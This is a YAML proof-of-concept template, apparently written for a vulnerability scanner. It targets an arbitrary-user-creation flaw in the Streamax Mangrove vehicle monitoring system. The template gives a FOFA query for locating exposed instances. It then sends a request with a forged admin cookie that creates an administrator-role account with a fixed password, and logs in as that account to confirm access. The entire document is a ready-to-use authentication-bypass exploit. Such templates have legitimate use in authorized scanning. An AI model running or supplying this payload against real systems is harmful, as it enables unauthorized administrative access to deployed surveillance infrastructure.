id: poc-yaml-mangrove-created-by-any-user
info:
  name: 锐明技术Mangrove Default.do 任意用户创建漏洞复现
  severity: high
  tags:
  - 权限绕过
  finger: Mangrove系统
  fofa: body="Mvsp/RegisterLogin/Default.do"
variables:
  t1: random_int(100,1000)
requests:
- method: POST
  path: /Mvsp/RoleUserInfo/Default.do?Action=CreateUser&Type=post&DataType=Text&Guid=
  headers:
    Cookie: MVSP.U=VUlEPTEmVU49YWRtaW4yJkdJRD0xJlJJRD0x;
    Content-Type: application/x-www-form-urlencoded
  data: UserId=&GroupPower=1&VehiclePower=&UserName=test{{.t1}}&RoleId=1&GroupId=1&ValidTime=&VideoTime=1&Enable=1&TelNo=1&Flow=&WarningFlow=&RealFlow=&MonthlyTime=&Description=&Email=&Password=qwer12341
  expression: "status_code == 200 && \ncontains(find_json(body,\"Code\"), \"200\"\
    ) &&\ncontains(find_json(body,\"Result\"), \"true\")\n"
- method: POST
  path: /Mvsp/RegisterLogin/Default.do?Action=Login&Type=post&DataType=Text&Guid=
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: JSESSIONID=; MVSP.C=Vj0yLjMuMS40LWNuJkw9emgtQ04mVD1kZWZhdWx0
  data: UserName=test{{.t1}}&Language=zh-CN&Password=qwer12341&AuthCode=
  expression: "status_code == 200 && \ncontains(find_json(body,\"Code\"), \"200\"\
    ) &&\ncontains(find_json(body,\"Result\"), \"true\")\n"
transport: http
